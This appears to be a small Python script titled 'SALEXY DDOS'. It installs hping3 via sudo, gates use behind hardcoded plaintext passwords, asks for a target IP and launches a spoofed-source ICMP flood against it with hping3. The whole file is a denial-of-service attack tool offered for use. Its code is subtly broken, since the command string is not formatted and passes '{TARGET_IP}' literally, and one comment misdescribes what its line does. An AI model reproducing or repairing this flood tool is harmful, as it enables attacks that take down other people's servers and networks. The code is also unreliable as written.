import os
os.system('pip3 install')
os.system('clear')
os.system('pip3 install colorama')
os.system('clear')
os.system('pip install --upgrade pip')
os.system('clear')
os.system('sudo apt install hping3 -y')
from colorama import init, Fore, Back, Style
init()
print (Fore.RED + 'PRESIONE CONTROL + C SI DESEA SALIR')
print (Fore.RED + 'PRESS CONTROL + C TO EXIT')
print(Fore.BLUE + Style.BRIGHT + "SALEXY DDOS")
print (Fore.BLACK + 'By Salexy')
usuarios = {
    "Alexxz": "Alex123","Deimoss": "Deimos123"
}

def login():
    username = input(Fore.BLACK + "Ingresa tu nombre de usuario: ")
    password = input(Fore.BLACK + "Ingresa tu contraseña: ")
    if username in usuarios and usuarios[username] == password:
        print(Fore.GREEN + "¡Inicio de sesión exitoso!")
        TARGET_IP = input('IP:')  # Pedir que el Usuario ingrese la IP
        print('# IP:', TARGET_IP)  # Esta línea imprime la IP introducida en un comentario
        os.system('hping3 --icmp --rand-source --flood -d 1400 {TARGET_IP}')  # Realiza el ping a la IP ingresada
    else:
        print(Fore.RED + "Credenciales incorrectas. Inténtalo de nuevo.")
        os.system('clear')

login()